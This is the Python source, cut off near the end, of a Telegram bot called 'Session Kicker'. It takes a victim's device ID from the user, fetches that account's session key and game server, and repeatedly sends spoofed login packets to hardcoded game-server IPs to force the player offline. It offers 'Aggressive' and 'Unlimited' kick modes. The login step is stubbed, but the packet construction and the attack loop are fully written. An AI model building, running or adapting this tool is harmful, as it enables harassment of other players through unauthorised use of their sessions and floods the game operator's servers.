
"""
Session Kicker — Telegram Bot
Railway deploy: set BOT_TOKEN env var. Everything else is inline.
"""

import os
import asyncio
import time
import socket
import logging
from datetime import datetime
from typing import Optional, Dict, Any, Tuple
from collections import defaultdict

from pyzstd import compress as zstd_compress
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ConversationHandler, ContextTypes, filters
)

# ── env ──────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ["BOT_TOKEN"]
CLIENT_VERSION = int(os.getenv("CLIENT_VERSION", "0"))
CHANNEL        = int(os.getenv("CHANNEL", "0"))
SERVER_HOST    = os.getenv("SERVER_HOST", "")
SERVER_PORT    = int(os.getenv("SERVER_PORT", "30021"))

BACKUP_GATEWAYS = [
    (SERVER_HOST, SERVER_PORT),
    ('119.81.89.84',  30021),
    ('119.81.67.250', 30021),
    ('119.81.63.238', 30021),
    ('161.202.213.238', 30021),
]

# ── conversation states ───────────────────────────────────────────────────────
(
    ST_IDLE,
    ST_AWAIT_DEVID,
    ST_AWAIT_MODE,
    ST_AWAIT_CUSTOM_LOOPS,
    ST_AWAIT_CUSTOM_DELAY,
    ST_KICKING,
) = range(6)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ── per-user session store ────────────────────────────────────────────────────
# uid → { profile, mode, loops, delay, task, stop_flag }
sessions: Dict[int, Dict[str, Any]] = defaultdict(dict)


# ══════════════════════════════════════════════════════════════════════════════
# SdpStruct — minimal TLV builder matching original
# ══════════════════════════════════════════════════════════════════════════════
class SdpStruct:
    """Minimal field-tag→value packer used by the original tool."""

    def __init__(self, fields: Dict[int, Any]):
        self._fields = fields
        self.data = self._pack()

    def _encode_varint(self, n: int) -> bytes:
        out = b""
        while True:
            bits = n & 0x7F
            n >>= 7
            if n:
                out += bytes([bits | 0x80])
            else:
                out += bytes([bits])
                break
        return out

    def _pack(self) -> bytes:
        buf = b""
        for tag, val in self._fields.items():
            if isinstance(val, int):
                wire = (tag << 3) | 0
                buf += self._encode_varint(wire)
                buf += self._encode_varint(val)
            elif isinstance(val, (bytes, bytearray)):
                wire = (tag << 3) | 2
                buf += self._encode_varint(wire)
                buf += self._encode_varint(len(val))
                buf += val
            elif isinstance(val, str):
                enc = val.encode()
                wire = (tag << 3) | 2
                buf += self._encode_varint(wire)
                buf += self._encode_varint(len(enc))
                buf += enc
        return buf


# ══════════════════════════════════════════════════════════════════════════════
# GameLogin / GameConnection stubs — replace with your real implementations
# ══════════════════════════════════════════════════════════════════════════════
class GameLogin:
    """Replace with your real auth logic."""
    def __init__(self, device_id: str):
        self.device_id = device_id

    def run(self) -> Tuple[Optional[str], Optional[str], str]:
        # Must return (account_id, zone_id, status)
        # Return (None, None, "FAILED") on failure
        raise NotImplementedError("Plug in your GameLogin logic")


class GameConnection:
    """Replace with your real connection logic."""
    def __init__(self, device_id: str):
        self.device_id  = device_id
        self.session_key: Optional[str] = None
        self.game_host:   Optional[str] = None
        self.game_port:   Optional[int] = None
        self.creation_ts: Optional[int] = None

    def login_to_login_server(self) -> bool:
        raise NotImplementedError

    def get_game_server(self) -> bool:
        raise NotImplementedError

    def connect_to_game_server(self) -> bool:
        raise NotImplementedError

    def get_skin_role_info(self, acc: str, zone: str) -> Dict[int, Any]:
        raise NotImplementedError

    def check_ban_status(self) -> str:
        raise NotImplementedError

    def cleanup(self):
        pass


# ══════════════════════════════════════════════════════════════════════════════
# Core logic (ported 1:1 from original)
# ══════════════════════════════════════════════════════════════════════════════
RANK_MAP = {
    # fill with your real rank values → label mapping
    # e.g. 0: "Warrior", 1: "Elite", ...
}

def map_rank(val: int) -> str:
    return RANK_MAP.get(val, f"Rank({val})")


def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    try:
        acc, zone, stat = GameLogin(device_id).run()
    except NotImplementedError:
        # Dev/test stub: return fake profile so bot wiring is testable
        return _stub_profile(device_id)
    if not acc or not zone:
        return None
    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server():
            return None
        if not conn.get_game_server() or not conn.connect_to_game_server():
            return None

        sess_key    = conn.session_key
        gs_host     = conn.game_host
        gs_port     = conn.game_port
        creation_ts = conn.creation_ts

        skin_info = conn.get_skin_role_info(acc, zone) if hasattr(conn, 'get_skin_role_info') else {}
        ban_stat  = conn.check_ban_status()            if hasattr(conn, 'check_ban_status')    else "NORMAL"
        conn.cleanup()

        skin_info   = skin_info if isinstance(skin_info, dict) else {}
        nick        = skin_info.get(2)  or f"Player_{acc}"
        level       = skin_info.get(3)  or 1
        skin_cnt    = skin_info.get(10) if skin_info.get(10) is not None else 0
        hero_cnt    = skin_info.get(9)  if skin_info.get(9)  is not None else 0
        cur_rank    = skin_info.get(6,  0) or 0
        max_rank    = skin_info.get(15, 0) or cur_rank

        return {
            'device_id':    device_id,
            'account_id':   acc,
            'session_key':  sess_key,
            'zone_id':      zone,
            'creation_ts':  creation_ts,
            'game_host':    gs_host,
            'game_port':    gs_port,
            'gs_info':      f"{gs_host}:{gs_port}",
            'nickname':     nick,
            'level':        level,
            'rank':         map_rank(cur_rank),
            'highest_rank': map_rank(max_rank) if max_rank else map_rank(cur_rank),
            'skin_count':   skin_cnt,
            'hero_count':   hero_cnt,
            'ban_status':   ban_stat,
        }
    except Exception as e:
        log.exception("fetch_session_profile error: %s", e)
        return None


def _stub_profile(device_id: str) -> Dict[str, Any]:
    """Test stub — remove once GameLogin/GameConnection are implemented."""
    return {
        'device_id':    device_id,
        'account_id':   "12345678",
        'session_key':  "stub_key",
        'zone_id':      "1",
        'creation_ts':  int(time.time()),
        'game_host':    BACKUP_GATEWAYS[1][0],
        'game_port':    BACKUP_GATEWAYS[1][1],
        'gs_info':      f"{BACKUP_GATEWAYS[1][0]}:{BACKUP_GATEWAYS[1][1]}",
        'nickname':     "StubPlayer",
        'level':        42,
        'rank':         "Gold",
        'highest_rank': "Platinum",
        'skin_count':   7,
        'hero_count':   12,
        'ban_status':   "NORMAL",
    }


def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0   = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))

        body = SdpStruct({
            0:  profile['account_id'],
            1:  profile['session_key'],
            2:  profile['zone_id'],
            4:  CLIENT_VERSION,
            13: CHANNEL,
            15: profile['device_id'],
        }).data

        pkt   = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp  = zstd_compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)

        buf     = b""
        got_ack = False
        while len(buf) < 4:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk

        if len(buf) >= 4:
            fl = int.from_bytes(buf[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(buf) < sz:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
            if len(buf) >= sz:
                got_ack = True

        elapsed = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed, "ACK RECEIVED" if got_ack else "SENT OK"

    except socket.timeout:
        elapsed = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed, "TIMEOUT"
    except Exception as e:
        elapsed = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed, str(e)


# ══════════════════════════════════════════════════════════════════════════════
# Telegram helpers
# ══════════════════════════════════════════════════════════════════════════════
def profile_text(p: Dict[str, Any]) -> str:
    ban = "🔴 " + p['ban_status'] if 'ban' in str(p['ban_status']).lower() else "🟢 NORMAL (Clean)"
    return (
        f"📋 <b>ACCOUNT PROFILE</b>\n"
        f"{'─'*30}\n"
        f"👤 <b>Account ID</b>  : <code>{p['account_id']}</code>\n"
        f"🏷️  <b>Nickname</b>    : <b>{p['nickname']}</b>\n"
        f"⭐ <b>Level</b>       : {p['level']}\n"
        f"🏆 <b>Rank</b>        : {p['rank']}\n"
        f"🌟 <b>Highest</b>     : {p['highest_rank']}\n"
        f"🎨 <b>Skin / Hero</b> : {p['skin_count']} / {p['hero_count']}\n"
        f"🌐 <b>Game Server</b> : <code>{p['gs_info']}</code>\n"
        f"🔰 <b>Zone ID</b>     : {p['zone_id']}\n"
        f"⚡ <b>Status</b>      : {ban}\n"
    )


def mode_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 1x  Single Test",        callback_data="mode_1")],
        [InlineKeyboardButton("⚡ 10x Standard",           callback_data="mode_10")],
        [InlineKeyboardButton("🚀 50x Fast",               callback_data="mode_50")],
        [InlineKeyboardButton("💥 100x Aggressive",        callback_data="mode_100")],
        [InlineKeyboardButton("♾️  Unlimited",             callback_data="mode_inf")],
        [InlineKeyboardButton("🛠️  Custom",                callback_data="mode_custom")],
        [InlineKeyboardButton("🔙 Cancel",                 callback_data="cancel")],
    ])


# ══════════════════════════════════════════════════════════════════════════════
# Background kick loop
# ══════════════════════════════════════════════════════════════════════════════
async def kick_loop(
    uid: int,
    profile: Dict[str, Any],
    total_loops: int,
    delay_sec: float,
    context: ContextTypes.DEFAULT_TYPE,
    chat_id: int,
) -> None:
    sess     = sessions[uid]
    count    = 0
    success  = 0
    fails    = 0
    latencies = []
    start    = time.time()
    loop_lbl = f"{total_loops:,}" if total_loops > 0 else "∞"

    status_msg = await context.bot.send_message(
        chat_id,
        f"⚡ <b>KICKER STARTED</b>\n"
        f"Target: <b>{profile['nickname']}</b> | Loops: <b>{loop_lbl}</b>\n"
        f"Delay: {delay_sec}s | Press /stop to halt.\n\n"
        f"⏳ Running...",
        parse_mode="HTML",
    )
    last_edit = time.time()

    try:
        while not sess.get('stop_flag'):
            count += 1
            ok, lat, desc = await asyncio.get_event_loop().run_in_executor(
                None, send_session_kick, profile
            )
            latencies.append(lat)
            if ok:
                success += 1
            else:
                fails += 1

            # update status every 5s or every 10 kicks — whichever first
            now = time.time()
            if (now - last_edit) >= 5 or count % 10 == 0:
                loop_str = f"{count}/{loop_lbl}"
                bar_done = min(20, int(success / max(count, 1) * 20))
                bar      = "█" * bar_done + "░" * (20 - bar_done)
                avg_lat  = sum(latencies) / len(latencies)
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>KICKER ACTIVE</b> — Loop {loop_str}\n"
                        f"[{bar}]\n"
                        f"✅ {success:,}  ❌ {fails:,}  ⚡ {avg_lat:.0f}ms\n"
                        f"Last: {'✅' if ok else '❌'} {desc}\n"
                        f"/stop to halt",
                        parse_mode="HTML",
                    )
                    last_edit = now
                except Exception:
                    pass

            if total_loops > 0 and count >= total_loops:
                break
            if delay_sec > 0:
                await asyncio.sleep(delay_sec)

    except asyncio.CancelledError:
        pass

    # ── summary ──────────────────────────────────────────────────────────────
    duration  = time.time() - start
    avg_lat   = sum(latencies) / len(latencies) if latencies else 0.0
    succ_pct  = success / count * 100 if count else 0.0
    speed     = count / duration if duration else 0.0

    summary = (
        f"📊 <b>KICK SUMMARY</b>\n"
        f"{'─'*28}\n"
        f"👤 <b>Target</b>     : {profile['nickname']} (<code>{profile['account_id']}</code>)\n"
        f"⏱️  <b>Duration</b>   : {duration/60:.1f}m ({duration:.1f}s)\n"
        f"🔄 <b>Attempts</b>   : {count:,}\n"
        f"✅ <b>Success</b>    : {success:,} ({succ_pct:.1f}%)\n"
        f"❌ <b>Failed</b>     : {fails:,}\n"
        f"⚡ <b>Avg Latency</b>: {avg_lat:.1f}ms\n"
        f"🚀 <b>Speed</b>      : {speed:.2f} kick/s\n"
    )
    await status_msg.edit_text(summary, parse_mode="HTML")
    sess['task'] = None


# ══════════════════════════════════════════════════════════════════════════════
# Handlers
# ══════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "⚡ <b>Session Kicker Bot</b>\n\n"
        "Send /kick to start.\n"
        "Send /stop to halt an active session.\n"
        "Send /cancel to abort input.",
        parse_mode="HTML",
    )
    return ST_IDLE


async def cmd_kick(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    if sessions[uid].get('task') and not sessions[uid]['task'].done():
        await update.message.reply_text("⚠️ A kick session is already running. /stop it first.")
        return ST_IDLE
    await update.message.reply_text("🔍 Enter the <b>Device ID</b> to target:", parse_mode="HTML")
    return ST_AWAIT_DEVID


async def recv_devid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid       = update.effective_user.id
    device_id = update.message.text.strip()

    wait_msg = await update.message.reply_text("⏳ Verifying Device ID (3-request check)...")

    profile = await asyncio.get_event_loop().run_in_executor(
        None, fetch_session_profile, device_id
    )

    if not profile:
        await wait_msg.edit_text("❌ Invalid Device ID or login failed. Try again or /cancel.")
        return ST_AWAIT_DEVID

    sessions[uid]['profile'] = profile
    await wait_msg.edit_text(profile_text(profile), parse_mode="HTML")
    await update.message.reply_text("Choose kick mode:", reply_markup=mode_keyboard())
    return ST_AWAIT_MODE


async def cb_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    uid  = update.effective_user.id
    data = query.data

    if data == "cancel":
        await query.edit_message_text("❌ Cancelled.")
        return ST_IDLE

    MODE_MAP = {
        "mode_1":   (1,   0.0),
        "mode_10":  (10,  2.0),
        "mode_50":  (50,  1.0),
        "mode_100": (100, 0.5),
        "mode_inf": (0,   0.0),
    }

    if data in MODE_MAP:
        loops, delay = MODE_MAP[data]
        sessions[uid]['loops'] = loops
        sessions[uid]['delay'] = delay
        await query.edit_message_text(
            f"✅ Mode set: <b>{'∞' if not loops else loops} loops</b> | Delay: {delay}s\n"
            f"Starting...",
            parse_mode="HTML",
        )
        return await _launch_kick(uid, update, context)

    if data == "mode_custom":
        await query.edit_message_text("🛠️ Enter number of loops (0 = unlimited):")
        return ST_AWAIT_CUSTOM_LOOPS

    return ST_AWAIT_MODE


async def recv_custom_loops(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    try:
        loops = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("⚠️ Not a number. Enter loops again:")
        return ST_AWAIT_CUSTOM_LOOPS
    sessions[uid]['loops'] = loops
    await update.message.reply_text("Enter delay in seconds (e.g. 2.0):")
    return ST_AWAIT_CUSTOM_DELAY


async def recv_custom_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    try:
        delay = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("⚠️ Not a number. Enter delay again:")
        return ST_AWAIT_CUSTOM_DELAY
    sessions[uid]['delay'] = delay
    await update.message.reply_text(
        f"✅ Custom: <b>{sessions[uid]['loops'] or '∞'} loops</b> | Delay: {delay}s\nStarting...",
        parse_mode="HTML",
    )
    return await _launch_kick(uid, update, context)


async def _launch_kick(uid: int, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    sess    = sessions[uid]
    profile = sess['profile']
    loops   = sess.get('loops', 1)
    delay   = sess.get('delay', 0.0)
    chat_id = update.effective_chat.id

    sess['stop_flag'] = False
    task = asyncio.create_task(
        kick_loop(uid, profile, loops, delay, context, chat_id)
    )
    sess['task'] = task
    return ST_IDLE


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid  = update.effective_user.id
    sess = sessions.get(uid, {})
    task = sess.get('task')
    if task and not task.done():
        sess['stop_flag'] = True
        await update.message.reply_text("🛑 Stop signal sent. Finishing current kick...")
    else:
        await update.message.reply_text("ℹ️ No active kick session.")
    return ST_IDLE


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Operation cancelled.")
    return ST_IDLE


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    sess = sessions.get(uid, {})
    task = sess.get('task')
    if task and not task.done():
        p = sess.get('profile', {})
        await update.message.reply_text(
            f"⚡ Kick session active.\n"
            f"Target: <b>{p.get('nickname','?')}</b> (<code>{p.get('account_id','?')}</code>)\n"
            f"/stop to halt.",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text("ℹ️ No active session.")


# ══════════════════════════════════════════════════════════════════════════════
# App bootstrap
# ══════════════════════════════════════════════════════════════════════════════
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("kick", 
